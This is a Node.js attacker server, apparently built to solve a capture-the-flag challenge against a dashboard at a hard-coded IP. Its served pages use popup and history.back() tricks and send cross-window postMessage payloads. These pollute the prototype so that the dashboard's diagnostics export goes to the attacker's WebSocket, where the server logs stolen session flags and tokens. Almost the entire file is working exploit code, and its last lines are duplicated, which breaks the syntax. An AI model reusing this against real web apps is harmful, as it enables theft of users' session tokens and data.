const express = require('express');
const expressWs = require('express-ws');

const app = express();
expressWs(app);

const PORT = process.env.PORT || 10000;
const TARGET = 'http://34.118.127.209:35666/';

// ── GET / ── Landing: open helper popup, then history.back() to dashboard ──
// If the bot visited the dashboard BEFORE our URL (common in CTF bots),
// history.back() returns to the dashboard in the same tab.
// The helper popup's window.opener then points to the dashboard window.
app.get('/', (req, res) => {
  const host = req.headers.host || req.hostname;
  const wsUrl = 'wss://' + host + '/ws';
  res.type('html').send(`<!DOCTYPE html>
<html><body>
<script>
function L(m){try{new Image().src='/log?'+encodeURIComponent(m)+'&_='+Date.now();}catch(e){}}
L('landing|ua='+navigator.userAgent);
L('histlen='+history.length);

// 1. Open helper popup (HTTPS→HTTPS, guaranteed)
var helper = window.open('/helper');
L('helper='+(helper?'ok':'null'));

// 2. Also try direct popup to dashboard (HTTP) — might work in some Chrome configs
var pop = null;
try {
  pop = window.open('${TARGET}', 'dashwin');
  L('pop='+(pop?'ok':'null'));
} catch(e){ L('pop_err='+e.message); }

// 3. After short delay, check popup status and try history.back()
setTimeout(function(){
  // Diagnostic: check if popup loaded the dashboard
  if(pop){
    try{L('pop.loc='+pop.location.href);}catch(e){L('pop.loc=CROSS_ORIGIN');}
    try{L('pop.len='+pop.length);}catch(e){L('pop.len=err');}
  }
  // history.back() — if bot visited dashboard before us, this goes back to it
  // Our page unloads, helper's window.opener becomes the dashboard
  if(history.length > 1){
    L('going_back');
    history.back();
  } else {
    L('no_history');
  }
}, 800);

// 4. Fallback: if we don't unload (history.back failed), attack the popup
var PP = JSON.parse('{"__proto__":{"telemetryConsent":true,"channelMode":"ws","realtimeEndpoint":"${wsUrl}"}}');
function attackPop(){
  if(!pop||pop.closed)return;
  try{L('f_pop.len='+pop.length);}catch(e){}
  pop.postMessage({type:'prefs:update',payload:{theme:PP}},'*');
  setTimeout(function(){pop.postMessage({type:'diagnostics:export'},'*');},500);
}
[3000,6000,9000,13000].forEach(function(d){setTimeout(attackPop,d);});
</script>
</body></html>`);
});

// ── GET /helper ── Popup that attacks window.opener (= dashboard after history.back) ──
app.get('/helper', (req, res) => {
  const host = req.headers.host || req.hostname;
  const wsUrl = 'wss://' + host + '/ws';
  res.type('html').send(`<!DOCTYPE html>
<html><body>
<script>
function L(m){try{new Image().src='/log?'+encodeURIComponent(m)+'&_='+Date.now();}catch(e){}}
L('helper_loaded');

var PP = JSON.parse('{"__proto__":{"telemetryConsent":true,"channelMode":"ws","realtimeEndpoint":"${wsUrl}"}}');

function attack(){
  if(!window.opener){L('h_no_opener');return;}

  // Check opener state
  var co=false;
  try{var x=window.opener.location.href;L('h_same='+x);}catch(e){co=true;L('h_cross');}
  try{L('h_len='+window.opener.length);}catch(e){L('h_len=err');}

  // ALWAYS postMessage regardless of origin check
  try{
    window.opener.postMessage({type:'prefs:update',payload:{theme:PP}},'*');
    L('h_pollute');
  }catch(e){L('h_pollute_err='+e.message);}
  setTimeout(function(){
    try{
      window.opener.postMessage({type:'diagnostics:export'},'*');
      L('h_trigger');
    }catch(e){L('h_trigger_err='+e.message);}
  },600);

  // Also try to find named window 'dashwin' (opened by landing page)
  try{
    var dw = window.open('','dashwin');
    if(dw && dw !== window){
      L('h_dashwin_found');
      dw.postMessage({type:'prefs:update',payload:{theme:PP}},'*');
      setTimeout(function(){dw.postMessage({type:'diagnostics:export'},'*');L('h_dashwin_trigger');},500);
    }
  }catch(e){L('h_dashwin_err='+e.message);}
}

var n=0;
var iv=setInterval(function(){
  n++;
  attack();
  L('h_attempt_'+n);
  if(n>=20)clearInterval(iv);
},1500);
</script>
</body></html>`);
});

// ── GET /log ── beacon logger ──
app.get('/log', (req, res) => {
  var raw = req.originalUrl.replace(/^\/log\?/,'').replace(/&_=\d+$/,'');
  console.log('[beacon]', decodeURIComponent(raw));
  res.status(204).end();
});

// ── WS /ws ── receive exfiltrated diagnostics ──
app.ws('/ws', (ws, req) => {
  console.log('[ws] connection from', req.ip);
  ws.on('message', (data) => {
    console.log('\n' + '='.repeat(62));
    console.log('  EXFILTRATED DIAGNOSTICS BUNDLE');
    console.log('='.repeat(62));
    try {
      const d = JSON.parse(data);
      console.log(JSON.stringify(d, null, 2));
      const s = d.session || {};
      if (s.flag) console.log('\n  >>> FLAG  =', s.flag);
      if (s.token) console.log('  >>> TOKEN =', s.token);
    } catch(e) {
      console.log(String(data).slice(0, 2000));
    }
    console.log('='.repeat(62) + '\n');
  });
  ws.on('close', () => console.log('[ws] closed'));
});

app.listen(PORT, () => {
  console.log('Listening on port', PORT);
});
      console.log(String(data).slice(0, 2000));
    }
    console.log('='.repeat(62) + '\n');
  });
  ws.on('close', () => console.log('[ws] closed'));
});

app.listen(PORT, () => {
  console.log('Listening on port', PORT);
});
